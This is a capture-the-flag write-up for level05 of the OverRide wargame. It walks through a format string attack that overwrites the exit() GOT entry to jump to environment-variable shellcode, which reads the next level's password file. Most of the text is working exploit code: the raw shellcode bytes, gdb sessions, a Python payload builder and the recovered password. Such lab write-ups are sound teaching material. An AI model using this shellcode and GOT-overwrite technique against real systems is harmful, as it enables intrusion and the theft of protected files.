# Level05

Looking at the source code, we have a very simple binary that will print a buffer (in an unsecured manner) that gets filled via a call to fgets. There is a XOR between 32 and each character if they're in uppercase, that will convert them to lowercase. A very simple trick we could do would be very similar to [rainfall level5](https://github.com/SERAC-SGM/rainfall-42/tree/main/level05) :

- We craft a payload that will show the next password, and store it in an env variable
- We change the address of exit in the global offset table (got) by the address of the env variable using a format string attack
- We enjoy the next level (no)

We can simply reuse the python code of rainfall level5, but this time instead of calling a function, we will call the address of the env variable as previously said. Unlike the function though, this address will most likely change each time we edit the variable so we'll have to recalculate the values in our exploit. That means this exploit won't work out of the box.

We crafted a very cute little shellcode in the last level, so we'll update and reuse it here :

    export PAYLOAD=$(python -c 'print "\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"')

Now, we need to find the offset of our format string attack (everything is explained in detail in rainfall levels 3 trough 5) :

    level05@OverRide:~$ ./level05 
    aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
    aaaa 0x64 0xf7fcfac0 0xf7ec3add 0xffffd61f 0xffffd61e (nil) 0xffffffff 0xffffd6a4 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 

We can see we need to edit the 10th %p (--> %10$p).

Next, we need the address of our PAYLOAD variable, and the address of the exit() function in the got.

    (gdb) disas main
    [...]
        0x08048513 <+207>:	call   0x8048370 <exit@plt>
    [...]
    (gdb) disas 0x8048370
    Dump of assembler code for function exit@plt:
    0x08048370 <+0>:	jmp    *0x80497e0
    0x08048376 <+6>:	push   $0x18
    0x0804837b <+11>:	jmp    0x8048330
    End of assembler dump.
    (gdb) x 0x80497e0
    0x80497e0 <exit@got.plt>:	0x08048376

First one, now the PAYLOAD address

    (gdb) break main
    Breakpoint 1 at 0x8048449
    (gdb) r
    Starting program: /home/users/level05/level05 

    Breakpoint 1, 0x08048449 in main ()
    (gdb) x/500s $esp
    [...]
    0xffffdef3:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"
    [...]
    (gdb) x/s 0xffffdefb
    0xffffdefb:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311̀\211\306\353\006\260\001\061\333̀\211\363\260\003\203\354\001\215\f$\262\001̀1\333\071\303t\346\260\004\263\001\262\001̀\203\304\001\353\337\350\311\377\377\377/home/users/level06/.pass"

Nailed it. Now, like rainfall level5, we slice the payload address in 2 parts : ffff and defb. We just need to play around with the numbers to get the final address right. Once we get the whole address :

    Breakpoint 1, 0x0804850c in main ()
    (gdb) x 0x80497e0
    0x80497e0 <exit@got.plt>:	0xffffdefb

We're good to go. Here is the python code that was used to overflow exit() :

    import struct

    PAYLOAD = 0xffffdefb
    EXIT_PLT = 0x80497e0

    def pad(s):
        return s+"Y"*(100-len(s))

    exploit = ""
    exploit += struct.pack("I",EXIT_PLT)
    exploit += struct.pack("I",EXIT_PLT+2)
    exploit += "aaaa"
    exploit += "%10$57071x"
    exploit += "%10$n"
    exploit += "%8452x"
    exploit += "%11$n"

    print pad(exploit)

Only one thing to remember : The last characters written are 64y for some reason

Now that our exploit is ready, we can simply run the binary :

    level05@OverRide:~$ python payload.py > payload
    level05@OverRide:~$ ./level05 < payload
    [...]
    64yh4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

Once we remove the previously mentioned "64y", we have our password : 

h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
